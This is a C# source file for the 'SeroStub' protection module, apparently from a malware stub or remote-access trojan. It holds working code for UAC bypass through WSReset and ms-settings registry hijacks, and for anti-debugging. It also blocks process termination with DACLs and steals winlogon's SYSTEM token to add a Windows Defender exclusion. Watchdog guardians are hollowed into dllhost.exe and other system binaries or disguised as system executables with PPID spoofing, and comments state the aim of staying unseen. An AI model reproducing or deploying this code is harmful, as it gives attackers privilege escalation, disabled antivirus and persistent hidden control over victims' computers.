using System.Diagnostics;
using System.Runtime.InteropServices;

namespace SeroStub;

internal static partial class Protection
{
    // â"€â"€ P/Invoke â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€

    [LibraryImport("kernel32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static partial bool IsDebuggerPresent();

    [LibraryImport("kernel32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static partial bool CheckRemoteDebuggerPresent(nint hProcess, [MarshalAs(UnmanagedType.Bool)] out bool isDebuggerPresent);

    [LibraryImport("ntdll.dll")]
    private static partial int NtQueryInformationProcess(nint hProcess, int processInfoClass, out nint info, int size, out int returnLength);

    [LibraryImport("ntdll.dll")]
    private static partial int NtSetInformationThread(nint hThread, int threadInfoClass, ref int info, int length);

    [LibraryImport("kernel32.dll")]
    private static partial nint GetCurrentThread();

    [LibraryImport("kernel32.dll")]
    private static partial nint GetCurrentProcess();

    [LibraryImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static partial bool GetCursorPos(out POINT lpPoint);

    [LibraryImport("user32.dll")]
    private static partial int GetSystemMetrics(int nIndex);

    [StructLayout(LayoutKind.Sequential)]
    private struct POINT { public int X; public int Y; }

    [StructLayout(LayoutKind.Sequential)]
    private struct MEMORYSTATUSEX
    {
        public uint dwLength;
        public uint dwMemoryLoad;
        public ulong ullTotalPhys;
        public ulong ullAvailPhys;
        public ulong ullTotalPageFile;
        public ulong ullAvailPageFile;
        public ulong ullTotalVirtual;
        public ulong ullAvailVirtual;
        public ulong ullAvailExtendedVirtual;
    }

    [LibraryImport("kernel32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static partial bool GlobalMemoryStatusEx(ref MEMORYSTATUSEX lpBuffer);

    [LibraryImport("kernel32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static partial bool TerminateProcess(nint hProcess, uint uExitCode);

    // ── UAC bypass (WSReset.exe AppX class hijack) ──────────────────────────

    /// <summary>
    /// Elevates to admin via WSReset.exe UAC bypass (AppX class handler hijack).
    /// WSReset auto-elevates and reads HKCU\Software\Classes\AppX82a6gwre4fdg3hasdf2hz4srm559tcv5\Shell\open\command.
    /// Falls back to computerdefaults (ms-settings) if WSReset is unavailable.
    /// Cleans up registry regardless of success; terminates on success.
    /// </summary>
    public static void TryUacBypassAndRestart()
    {
        if (_TryWsResetBypass()) { TerminateProcess(GetCurrentProcess(), 0); return; }
        if (_TryComputerDefaultsBypass()) { TerminateProcess(GetCurrentProcess(), 0); return; }
    }

    private static bool _TryWsResetBypass()
    {
        const string cmdKey  = @"Software\Classes\AppX82a6gwre4fdg3hasdf2hz4srm559tcv5\Shell\open\command";
        const string openKey = @"Software\Classes\AppX82a6gwre4fdg3hasdf2hz4srm559tcv5\Shell\open";
        const string shKey   = @"Software\Classes\AppX82a6gwre4fdg3hasdf2hz4srm559tcv5\Shell";
        const string baseKey = @"Software\Classes\AppX82a6gwre4fdg3hasdf2hz4srm559tcv5";
        try
        {
            var exe = Environment.ProcessPath;
            if (string.IsNullOrEmpty(exe) || !File.Exists(exe)) return false;

            var wsreset = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.System), "WSReset.exe");
            if (!File.Exists(wsreset)) return false;

            using var key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(cmdKey);
            if (key == null) return false;
            key.SetValue("", exe);
            key.SetValue("DelegateExecute", "");

            using var proc = Process.Start(new ProcessStartInfo(wsreset)
            {
                UseShellExecute = false,
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
            });
            proc?.WaitForExit(4000);
            return true;
        }
        catch { return false; }
        finally
        {
            try { Microsoft.Win32.Registry.CurrentUser.DeleteSubKey(cmdKey,  false); } catch { }
            try { Microsoft.Win32.Registry.CurrentUser.DeleteSubKey(openKey, false); } catch { }
            try { Microsoft.Win32.Registry.CurrentUser.DeleteSubKey(shKey,   false); } catch { }
            try { Microsoft.Win32.Registry.CurrentUser.DeleteSubKey(baseKey, false); } catch { }
        }
    }

    private static bool _TryComputerDefaultsBypass()
    {
        const string cmdKey   = @"Software\Classes\ms-settings\Shell\Open\command";
        const string openKey  = @"Software\Classes\ms-settings\Shell\Open";
        const string shKey    = @"Software\Classes\ms-settings\Shell";
        const string baseKey  = @"Software\Classes\ms-settings";
        try
        {
            var exe = Environment.ProcessPath;
            if (string.IsNullOrEmpty(exe) || !File.Exists(exe)) return false;

            var cmpdef = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.System), "computerdefaults.exe");
            if (!File.Exists(cmpdef)) return false;

            using var key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(cmdKey);
            if (key == null) return false;
            key.SetValue("", exe);
            key.SetValue("DelegateExecute", "");

            using var proc = Process.Start(new ProcessStartInfo(cmpdef)
            {
                UseShellExecute = false,
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
            });
            proc?.WaitForExit(4000);
            return true;
        }
        catch { return false; }
        finally
        {
            try { Microsoft.Win32.Registry.CurrentUser.DeleteSubKey(cmdKey,  false); } catch { }
            try { Microsoft.Win32.Registry.CurrentUser.DeleteSubKey(openKey, false); } catch { }
            try { Microsoft.Win32.Registry.CurrentUser.DeleteSubKey(shKey,   false); } catch { }
            try { Microsoft.Win32.Registry.CurrentUser.DeleteSubKey(baseKey, false); } catch { }
        }
    }

    // â"€â"€ Anti-Debug â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€

    public static bool IsDebuggerDetected()
    {
        if (Debugger.IsAttached) return true;
        if (IsDebuggerPresent()) return true;
        if (CheckRemoteDebuggerPresent(GetCurrentProcess(), out bool remote) && remote) return true;

        // NtQueryInformationProcess - DebugPort (0x7)
        if (NtQueryInformationProcess(GetCurrentProcess(), 0x7, out nint debugPort, nint.Size, out _) == 0 && debugPort != 0)
            return true;

        // Timing check â€" use a higher threshold to avoid false positives on loaded systems
        long t1 = Environment.TickCount64;
        Thread.SpinWait(1000);
        long t2 = Environment.TickCount64;
        if (t2 - t1 > 500) return true;

        return false;
    }

    public static void HideFromDebugger()
    {
        int zero = 0;
        NtSetInformationThread(GetCurrentThread(), 0x11, ref zero, 0);
    }

    // â"€â"€ Anti-Kill (Critical Process â†' BSOD on terminate) â"€â"€

    [LibraryImport("ntdll.dll")]
    private static partial int NtSetInformationProcess(nint hProcess, int processInfoClass, ref int processInfo, int length);

    // Receives CTRL_SHUTDOWN_EVENT (6) / CTRL_LOGOFF_EVENT (5) before TerminateProcess
    [LibraryImport("kernel32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static partial bool SetConsoleCtrlHandler(nint handler, [MarshalAs(UnmanagedType.Bool)] bool add);

    // P/Invoke for DACL protection
    [LibraryImport("advapi32.dll", SetLastError = true)]
    private static partial int SetSecurityInfo(
        nint handle, int objectType, uint securityInfo,
        nint psidOwner, nint psidGroup, nint pDacl, nint pSacl);

    [LibraryImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static partial bool InitializeAcl(nint pAcl, int nAclLength, int dwAclRevision);

    [LibraryImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static partial bool AddAccessDeniedAce(nint pAcl, int dwAceRevision, uint AccessMask, nint pSid);

    [LibraryImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static partial bool AddAccessAllowedAce(nint pAcl, int dwAceRevision, uint AccessMask, nint pSid);

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool AllocateAndInitializeSid(
        byte[] pIdentifierAuthority,
        byte nSubAuthorityCount,
        uint nSubAuthority0, uint nSubAuthority1, uint nSubAuthority2, uint nSubAuthority3,
        uint nSubAuthority4, uint nSubAuthority5, uint nSubAuthority6, uint nSubAuthority7,
        out nint pSid);

    [DllImport("advapi32.dll")]
    private static extern nint FreeSid(nint pSid);
    // Source - https://stackoverflow.com/q/50996439
    // Posted by JustHobby, modified by community. See post 'Timeline' for change history
    // Retrieved 2026-03-30, License - CC BY-SA 4.0

    // P/Invoke for anti-suspend loop (guardian)
    [DllImport("ntdll.dll")]
    private static extern int NtResumeProcess(nint hProcess);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern nint OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool CloseHandle(nint hObject);




    [DllImport("ntdll.dll")]
    private static extern uint RtlAdjustPrivilege
  (
      int Privilege,
      bool bEnablePrivilege,
      bool IsThreadPrivilege,
      out bool PreviousValue
  );

    public static void EnablePrivilege(int privilegeId)
    {
        bool wasEnabled;
        uint status = RtlAdjustPrivilege(privilegeId, true, false, out wasEnabled);
        if (status != 0)
        {
            StubLog.Error($"[AntiKill] RtlAdjustPrivilege({privilegeId}) failed: 0x{status:X}");
        }
    }


    public static void SetCriticalProcess()
    {
        // ProcessBreakOnTermination (BSOD-on-kill) is NOT used — it cannot be safely
        // unset before Windows calls NtTerminateProcess during shutdown, especially
        // for session-0 / hollowed processes that receive no shutdown notification.
        //
        // DACL protection is the correct anti-kill mechanism:
        //   • Denies PROCESS_TERMINATE + PROCESS_SUSPEND_RESUME for Everyone
        //   • Blocks Task Manager, Process Explorer, and all unprivileged tools
        //   • Windows shutdown (smss/wininit with SeDebugPrivilege) bypasses DACL
        //     cleanly → no BSOD, normal restart/shutdown works fine
        //
        // This also makes AntiKill useful without EnableWatchdog.
        try
        {
            ProtectProcessDacl();
            StubLog.Info("[AntiKill] DACL active (deny TERMINATE for everyone — clean shutdown preserved).");
        }
        catch (Exception ex) { StubLog.Error($"[AntiKill] DACL failed: {ex.Message}"); }
    }

    public static void UnsetCriticalProcess()
    {
        try
        {
            EnablePrivilege(20);
            EnablePrivilege(6);
            EnablePrivilege(19);
            int isCritical = 0;
            // ProcessBreakOnTermination = 29

            int status = NtSetInformationProcess(GetCurrentProcess(), 29, ref isCritical, sizeof(int));
            StubLog.Info(status == 0 ? "[AntiKill] Process unmarked as critical." : $"[AntiKill] UnsetCriticalProcess failed: 0x{status:X}");
        }
        catch (Exception ex) { StubLog.Error($"[AntiKill] Unset failed: {ex.Message}"); }
    }
    /// <summary>
    /// User-mode anti-kill: DENY PROCESS_TERMINATE + PROCESS_SUSPEND_RESUME for Everyone.
    /// Blocks TerminateProcess() and NtSuspendProcess() from outside.
    /// Guardians bypass via SeDebugPrivilege when they need to call NtResumeProcess.
    /// Works in both SingleFile and RunPE (hollowed process) modes.
    /// </summary>
    public static void ProtectProcessDacl()
    {
        // Two ACEs for Everyone (S-1-1-0):
        //   1. DENY  TERMINATE | SUSPEND_RESUME  — blocks kill and suspend from any unprivileged caller
        //   2. ALLOW everything else             — lets guardian WaitForExit/HasExited work
        const uint PROCESS_TERMINATE       = 0x0001;
        const uint PROCESS_SUSPEND_RESUME  = 0x0800;
        const uint DENY_MASK               = PROCESS_TERMINATE | PROCESS_SUSPEND_RESUME; // 0x0801
        const uint PROCESS_ALL_EXCEPT_DENY = 0x001FF7FE; // PROCESS_ALL_ACCESS(0x1FFFFF) & ~0x0801
        const int  ACL_REVISION = 2;
        const uint DACL_SI = 4 | 0x80000000u; // DACL_SECURITY_INFORMATION | PROTECTED_DACL

        nint everyoneSid = 0;
        nint pAcl = 0;
        try
        {
            byte[] worldAuth = [0, 0, 0, 0, 0, 1]; // SECURITY_WORLD_SID_AUTHORITY
            if (!AllocateAndInitializeSid(worldAuth, 1, 0, 0, 0, 0, 0, 0, 0, 0, out everyoneSid)
                || everyoneSid == 0) return;

            // SID size for S-1-1-0 = 12 bytes. Each ACE = ACE_HEADER(4) + Mask(4) + SID(12) = 20 bytes.
            // ACL = header(8) + DENY ACE(20) + ALLOW ACE(20) = 48 bytes
            int aclSize = 8 + 20 + 20;
            pAcl = Marshal.AllocHGlobal(aclSize);
            if (!InitializeAcl(pAcl, aclSize, ACL_REVISION)) return;

            AddAccessDeniedAce(pAcl, ACL_REVISION, DENY_MASK, everyoneSid);
            AddAccessAllowedAce(pAcl, ACL_REVISION, PROCESS_ALL_EXCEPT_DENY, everyoneSid);

            SetSecurityInfo(GetCurrentProcess(), 6, DACL_SI, 0, 0, pAcl, 0);
            StubLog.Info("[DACL] PROCESS_TERMINATE + PROCESS_SUSPEND_RESUME denied for Everyone.");
        }
        catch (Exception ex) { StubLog.Error($"[DACL] Failed: {ex.Message}"); }
        finally
        {
            if (everyoneSid != 0) FreeSid(everyoneSid);
            if (pAcl != 0) Marshal.FreeHGlobal(pAcl);
        }
    }

    /// <summary>Removes the DACL protection (sets null DACL = full access) before uninstall/exit.</summary>
    public static void RemoveDacl()
    {
        try
        {
            // NULL DACL = unrestricted access (needed so the process can exit cleanly)
            const uint DACL_SI = 4 | 0x80000000u;
            SetSecurityInfo(GetCurrentProcess(), 6, DACL_SI, 0, 0, 0, 0);
        }
        catch { }
    }

    // ── WMI Defender Exclusion (native, no PowerShell) ───────────────────────

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool OpenProcessToken(nint hProcess, uint dwDesiredAccess, out nint phToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool DuplicateTokenEx(
        nint hExistingToken, uint dwDesiredAccess, nint lpTokenAttributes,
        int ImpersonationLevel, int TokenType, out nint phNewToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool ImpersonateLoggedOnUser(nint hToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool RevertToSelf();

    [System.Diagnostics.CodeAnalysis.RequiresUnreferencedCode("WMI")]
    public static void AddDefenderExclusion(string path)
    {
        nint hToken = 0, hDup = 0;
        bool impersonated = false;
        try
        {
            // Steal SYSTEM token from winlogon.exe so the WMI call runs as SYSTEM
            var wl = Process.GetProcessesByName("winlogon").FirstOrDefault();
            if (wl != null)
            {
                nint hProc = OpenProcess(0x400 /*PROCESS_QUERY_INFORMATION*/, false, wl.Id);
                if (hProc != 0)
                {
                    if (OpenProcessToken(hProc, 0x0002 /*TOKEN_DUPLICATE*/, out hToken))
                    {
                        // SecurityImpersonation=2, TokenImpersonation=2
                        DuplicateTokenEx(hToken, 0xF01FF /*TOKEN_ALL_ACCESS*/, 0, 2, 2, out hDup);
                        if (hDup != 0) impersonated = ImpersonateLoggedOnUser(hDup);
                    }
                    CloseHandle(hProc);
                }
            }

            // MSFT_MpPreference.Add() — the Defender WMI provider (trusted) performs the change
            var scope = new System.Management.ManagementScope(
                @"\\.\root\Microsoft\Windows\Defender");
            scope.Options.Impersonation = System.Management.ImpersonationLevel.Impersonate;
            scope.Options.EnablePrivileges = true;
            scope.Connect();

            using var cls = new System.Management.ManagementClass(
                scope, new System.Management.ManagementPath("MSFT_MpPreference"), null);
            using var inParams = cls.GetMethodParameters("Add");
            inParams["ExclusionPath"] = new[] { path };
            cls.InvokeMethod("Add", inParams, null);

            StubLog.Info($"[Defender] Exclusion added: {path}");
        }
        catch (Exception ex) { StubLog.Error($"[Defender] WMI exclusion failed: {ex.Message}"); }
        finally
        {
            if (impersonated) RevertToSelf();
            if (hDup != 0) CloseHandle(hDup);
            if (hToken != 0) CloseHandle(hToken);
        }
    }

    // ── Anti-Kill Watchdog (usermode guardian process) ──

    private static volatile bool _guardianRunning;
    private static volatile int _guardianPid1 = -1;
    private static volatile int _guardianPid2 = -1;
    private static volatile int _guardianPid3 = -1;
    private static volatile int _guardianPid4 = -1;

    private static string StopFlagPath => Path.Combine(
        Path.GetTempPath(), "SERO_STOP_" + Config.PersistName + ".flag");

    public static void ClearStopFlag()
    {
        try { if (File.Exists(StopFlagPath)) File.Delete(StopFlagPath); } catch { }
    }

    // Returns true if a stop flag exists that was written within the last 15 seconds,
    // meaning we were relaunched by a guardian right after an uninstall/stop.
    public static bool IsRecentStopFlag()
    {
        try
        {
            string p = StopFlagPath;
            if (!File.Exists(p)) return false;
            return (DateTime.UtcNow - File.GetLastWriteTimeUtc(p)).TotalSeconds < 15;
        }
        catch { return false; }
    }

    public static void StopGuardian()
    {
        _guardianRunning = false;

        // Write a flag file BEFORE killing guardians. Unlike a named kernel object,
        // a file persists after this process dies, so guardians that wake up later
        // will still see the signal and not relaunch.
        try { File.WriteAllText(StopFlagPath, Environment.ProcessId.ToString()); } catch { }

        Thread.Sleep(650);

        var toWait = new List<Process>();
        foreach (int pid in new[] { _guardianPid1, _guardianPid2, _guardianPid3, _guardianPid4 })
        {
            if (pid <= 0) continue;
            try
            {
                var p = Process.GetProcessById(pid);
                p.Kill();
                toWait.Add(p);
            }
            catch { }
        }
        foreach (var p in toWait)
        {
            try { p.WaitForExit(2000); } catch { }
            try { p.Dispose(); } catch { }
        }

        _guardianPid1 = _guardianPid2 = _guardianPid3 = _guardianPid4 = -1;
    }

    public static void StartAntiKillWatchdog()
    {
        if (_guardianRunning) return;
        _guardianRunning = true;

        // Store our PID so guardians can check if we're still alive before relaunching
        Environment.SetEnvironmentVariable("SERO_MAIN_PID", Environment.ProcessId.ToString());

        // Start guardian thread
        var thread = new Thread(GuardianLoop)
        {
            IsBackground = true,
            Priority = ThreadPriority.Highest
        };
        thread.Start();

        StubLog.Info("[Watchdog] Guardian started (DACL + process respawn)");
    }

    private static void GuardianLoop()
    {
        var selfPid = Environment.ProcessId;

        while (_guardianRunning)
        {
            try
            {
                var exePath = Persistence.GetInstalledPath(Config.PersistName)
                    ?? Environment.GetEnvironmentVariable("SERO_EXE")
                    ?? Environment.ProcessPath;
                if (string.IsNullOrEmpty(exePath) || !File.Exists(exePath))
                {
                    Thread.Sleep(2000);
                    continue;
                }

                        // Staggered spawn: each guardian starts with a delay to avoid all 4 appearing
                // simultaneously in process monitors (would look suspicious as a group).
                int p1 = _guardianPid1; SpawnGuardianIfDead(ref p1, selfPid, exePath, 1); _guardianPid1 = p1;
                Thread.Sleep(800);
                int p2 = _guardianPid2; SpawnGuardianIfDead(ref p2, selfPid, exePath, 2); _guardianPid2 = p2;
                Thread.Sleep(800);
                int p3 = _guardianPid3; SpawnGuardianIfDead(ref p3, selfPid, exePath, 3); _guardianPid3 = p3;
                Thread.Sleep(800);
                int p4 = _guardianPid4; SpawnGuardianIfDead(ref p4, selfPid, exePath, 4); _guardianPid4 = p4;
            }
            catch (Exception ex)
            {
                StubLog.Error($"[AntiKill] Guardian loop error: {ex.Message}");
            }

            Thread.Sleep(200); // 200ms — respawn dead guardian within ~1s of detection
        }
    }

    // 4 hollow targets for guardians — chosen because they run without required CLI args,
    // don't get terminated by SCM/COM if they don't respond, and are common enough that
    // multiple instances are normal (dllhost especially).
    private static readonly string[] _guardianTargets =
    [
        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "dllhost.exe"),
        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "SearchProtocolHost.exe"),
        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "SearchFilterHost.exe"),
        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "dllhost.exe"),
    ];

    // Guardian disguise names — intentionally NOT dllhost/RuntimeBroker to avoid appearing
    // alongside common payload targets when searched in Process Hacker.
    private static readonly string[] _singleFileGuardianNames =
    [
        "SearchProtocolHost.exe",
        "SearchFilterHost.exe",
        "taskhostw.exe",
        "sihost.exe",
    ];

    private static readonly string _guardianDisguiseDir = Path.Combine(
        Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
        "Microsoft", "CoreRuntime");

    private static readonly string?[] _singleFilePaths = new string?[4];

    /// <summary>
    /// Prepares a disguised copy of the stub exe with a system-sounding name for the given slot.
    /// Creates the dir hidden+system, copies exe, marks it hidden+system too.
    /// Returns the disguise path, or null on failure.
    /// </summary>
    private static string? PrepareGuardianCopy(int slot, string realExePath)
    {
        try
        {
            Directory.CreateDirectory(_guardianDisguiseDir);
            File.SetAttributes(_guardianDisguiseDir,
                FileAttributes.Hidden | FileAttributes.System);

            var dst = Path.Combine(_guardianDisguiseDir,
                _singleFileGuardianNames[(slot - 1) % _singleFileGuardianNames.Length]);

            // Only copy if missing or outdated
            if (!File.Exists(dst) ||
                new FileInfo(dst).LastWriteTimeUtc < new FileInfo(realExePath).LastWriteTimeUtc)
            {
                File.Copy(realExePath, dst, overwrite: true);
                File.SetAttributes(dst, FileAttributes.Hidden | FileAttributes.System);
            }

            _singleFilePaths[slot - 1] = dst;
            return dst;
        }
        catch (Exception ex)
        {
            StubLog.Error($"[Guardian] Copy slot {slot} failed: {ex.Message}");
            return null;
        }
    }

    /// <summary>Removes all disguised guardian copies (called on uninstall).</summary>
    public static void CleanupGuardianCopies()
    {
        try
        {
            if (Directory.Exists(_guardianDisguiseDir))
                Directory.Delete(_guardianDisguiseDir, recursive: true);
        }
        catch { }
    }

    private static void SpawnGuardianIfDead(ref int pidField, int selfPid, string exePath, int slot)
    {
        // Don't spawn new guardians if we're shutting down — prevents respawn
        // race during StopGuardian() where the GuardianLoop kills G1 and
        // immediately respawns it with a new PID that StopGuardian() doesn't know about.
        if (!_guardianRunning) return;

        bool alive = false;
        if (pidField > 0)
        {
            try { using var p = Process.GetProcessById(pidField); alive = !p.HasExited; }
            catch { alive = false; }
        }
        if (alive) return;

        int newPid = -1;

        if (Config.EnableHollowing)
        {
            // True process hollowing: inject our PE into a real system binary so the guardian
            // appears as that process in Task Manager — no renamed copies, no fake exe.
            // SERO_GUARDIAN is passed via an explicit env block built inside Hollow() to avoid
            // any race condition with the parent's environment variables.
            var target = _guardianTargets[(slot - 1) % _guardianTargets.Length];
            newPid = ProcessHollowing.Hollow(exePath, target, skipPpidSpoof: false,
                envOverrides: new Dictionary<string, string?>
                {
                    ["SERO_GUARDIAN"]              = selfPid.ToString(),
                    ["SERO_MAIN_PID"]              = selfPid.ToString(),
                    [ProcessHollowing.HOLLOW_ENV_KEY] = ProcessHollowing.HOLLOW_ENV_VAL,
                    ["SERO_EXE"]                   = exePath,
                });
        }
        else
        {
            var disguisedPath = PrepareGuardianCopy(slot, exePath) ?? exePath;
            newPid = ProcessHollowing.SpawnDetached(disguisedPath, new Dictionary<string, string?>
            {
                ["SERO_GUARDIAN"]              = selfPid.ToString(),
                ["SERO_MAIN_PID"]              = selfPid.ToString(),
                [ProcessHollowing.HOLLOW_ENV_KEY] = null,
                ["SERO_EXE"]                   = exePath,
                ["SERO_GUARDIAN_SELF"]         = disguisedPath,
            });
        }

        pidField = newPid;
        if (newPid > 0)
            StubLog.Info($"[AntiKill] Guardian{slot} PID={newPid} (hollow={Config.EnableHollowing})");
    }

    /// <summary>
    /// Hollows our exe into a legitimate target process so the guardian appears
    /// as that process (e.g. dllhost.exe) with Explorer as parent — invisible in process tree.
    /// </summary>
    private static int SpawnHollowedGuardian(string exePath, string hollowTarget, int selfPid)
    {
        // Temporarily inject SERO_GUARDIAN into our env so the hollowed child inherits it.
        // SERO_MAIN_PID and SERO_EXE are already correctly set in our env.
        Environment.SetEnvironmentVariable("SERO_GUARDIAN", selfPid.ToString());
        try
        {
            // Hollow our PE into the target. PPID-spoofed to Explorer (skipPpidSpoof=false).
            // Returns the PID of the hollowed target process, or -1 on failure.
            return ProcessHollowing.Hollow(exePath, hollowTarget, skipPpidSpoof: false);
        }
        finally
        {
            // Clear immediately — child already inherited a snapshot of our env at CreateProcess time
            Environment.SetEnvironmentVariable("SERO_GUARDIAN", null);
        }
    }

    /// <summary>
    /// Called at startup to check if we're running as a guardian process.
    /// If so, monitor the parent and relaunch it if killed, then exit.
    /// Returns true if this instance is a guardian (caller should not continue normal flow).
    /// </summary>
    public static bool RunAsGuardianIfNeeded()
    {
        var guardianEnv = Environment.GetEnvironmentVariable("SERO_GUARDIAN");
        if (string.IsNullOrEmpty(guardianEnv) || !int.TryParse(guardianEnv, out int parentPid))
            return false;

        // We are a guardian -- monitor the parent
        StubLog.Info($"[Guardian] Monitoring parent PID={parentPid}");

        // In SingleFile mode, guardian copies are plain .NET executables — protect
        // this process with DACL so it can't be killed by TerminateProcess().
        // In RunPE mode the guardian is already inside a legitimate system process
        // so applying DACL here is harmless (same protection, different host).
        if (Config.EnableWatchdog)
            ProtectProcessDacl();

        // Clear SERO_GUARDIAN from our own environment so that when we
        // relaunch the main process, it does NOT inherit this variable and
        // doesn't accidentally become another guardian.
        Environment.SetEnvironmentVariable("SERO_GUARDIAN", null);

        // Anti-suspend: keep the main process running even if an attacker suspends it.
        // This thread calls NtResumeProcess every 100 ms and exits when the main process dies.
        var resumeThread = new Thread(() => AntiSuspendLoop(parentPid))
        {
            IsBackground = true,
            Priority = ThreadPriority.Highest
        };
        resumeThread.Start();

        // Wait for parent to die — two methods:
        // 1. WaitForExit() is ideal but requires SYNCHRONIZE access (may fail with aggressive DACL)
        // 2. Polling by PID fallback — always works regardless of DACL
        WaitForProcessDeath(parentPid);
        StubLog.Info("[Guardian] Parent died, relaunching...");
        RelaunchMain();

        return true;
    }

    /// <summary>
    /// Runs in the guardian: calls NtResumeProcess every 100 ms so the main process
    /// cannot stay suspended even if an attacker bypasses the DENY DACL via a kernel driver.
    /// Uses SeDebugPrivilege to open the DACL-protected target.
    /// Exits silently when the target PID disappears.
    /// </summary>
    private static void AntiSuspendLoop(int pid)
    {
        const uint PROCESS_SUSPEND_RESUME = 0x0800;
        EnablePrivilege(20); // SeDebugPrivilege — lets us open a DACL-protected process

        while (true)
        {
            nint hProc = OpenProcess(PROCESS_SUSPEND_RESUME, false, pid);
            if (hProc == 0)
            {
                // Either dead or still no access — check if dead
                try { Process.GetProcessById(pid); }
                catch (ArgumentException) { return; } // process gone, stop loop
                Thread.Sleep(200);
                continue;
            }
            try
            {
                // NtResumeProcess is a no-op when suspend count is already 0,
                // so calling it on a running process is safe.
                NtResumeProcess(hProc);
            }
            finally { CloseHandle(hProc); }

            Thread.Sleep(100);
        }
    }

    /// <summary>
    /// Waits until the process with the given PID exits.
    /// Tries WaitForExit() first (efficient), falls back to 1-second PID polling
    /// if the DACL on the target process blocks SYNCHRONIZE access.
    /// </summary>
    private static void WaitForProcessDeath(int pid)
    {
        // Try WaitForExit (requires SYNCHRONIZE — works with our targeted DENY DACL)
        try
        {
            using var proc = Process.GetProcessById(pid);
            proc.WaitForExit();
            return;
        }
        catch (ArgumentException)
        {
            return; // Already dead
        }
        catch
        {
            // DACL blocked WaitForExit — fall through to polling
            StubLog.Info("[Guardian] WaitForExit blocked by DACL, switching to polling...");
        }

        // Fallback: poll every second until PID disappears
        // Record start time of the target process to detect PID reuse
        DateTime? targetStartTime = null;
        try
        {
            using var p0 = Process.GetProcessById(pid);
            try { targetStartTime = p0.StartTime; } catch { }
        }
        catch { }

        while (true)
        {
            try
            {
                using var proc = Process.GetProcessById(pid);
                // PID reuse check: if StartTime differs, original process is dead
                if (targetStartTime.HasValue)
                {
                    try
                    {
                        if (proc.StartTime != targetStartTime.Value) return;
                    }
                    catch { return; } // Can't read StartTime → process gone or replaced
                }
                try { if (proc.HasExited) return; } catch { }
            }
            catch (ArgumentException)
            {
                return; // PID no longer exists
            }
            catch { }

            Thread.Sleep(300); // 300ms — tighter kill window than original 1s
        }
    }

    private static void RelaunchMain()
    {
        // Check flag file — if present, main exited intentionally (uninstall/update).
        try
        {
            if (File.Exists(StopFlagPath))
            {
                StubLog.Info("[Guardian] Stop flag present, NOT relaunching.");
                return;
            }
        }
        catch { }

        // If main is still alive (e.g. this guardian was killed independently),
        // don't relaunch — GuardianLoop in the main process will respawn us.
        var mainPidStr = Environment.GetEnvironmentVariable("SERO_MAIN_PID");
        if (int.TryParse(mainPidStr, out int mainPid) && mainPid > 0)
        {
            try
            {
                using var p = Process.GetProcessById(mainPid);
                if (!p.HasExited)
                {
                    StubLog.Info("[Guardian] Main still alive, skipping relaunch.");
                    return;
                }
            }
            catch (ArgumentException) { } // dead — proceed
            catch { }
        }

        // Mutex arbitration: when two guardians detect main death simultaneously,
        // only the first to acquire the mutex actually relaunches.
        using var mutex = new Mutex(false, "Global\\" + Config.PersistName + "_RL");
        bool got = false;
        try { got = mutex.WaitOne(0); } catch { }
        if (!got)
        {
            StubLog.Info("[Guardian] Another guardian is already relaunching, skipping.");
            return;
        }

        try
        {
            var exePath = Persistence.GetInstalledPath(Config.PersistName)
                ?? Environment.GetEnvironmentVariable("SERO_EXE")
                ?? Environment.ProcessPath;

            if (string.IsNullOrEmpty(exePath) || !File.Exists(exePath))
            {
                StubLog.Error("[Guardian] Could not find exe to relaunch.");
                return;
            }

            // Use SpawnDetached so the relaunched main is PPID-spoofed to Explorer —
            // it won't appear as a child of this guardian in the process tree.
            int pid = ProcessHollowing.SpawnDetached(exePath, new Dictionary<string, string?>
            {
                ["SERO_GUARDIAN"]         = null,
                [ProcessHollowing.HOLLOW_ENV_KEY] = null,
                ["SERO_EXE"]              = exePath,
            });

            if (pid > 0)
                StubLog.Info($"[Guardian] Main relaunched PID={pid} from {exePath}");
            else
                StubLog.Error("[Guardian] SpawnDetached failed for relaunch.");
        }
        finally
        {
            try { mutex.ReleaseMutex(); } catch { }
        }
    }

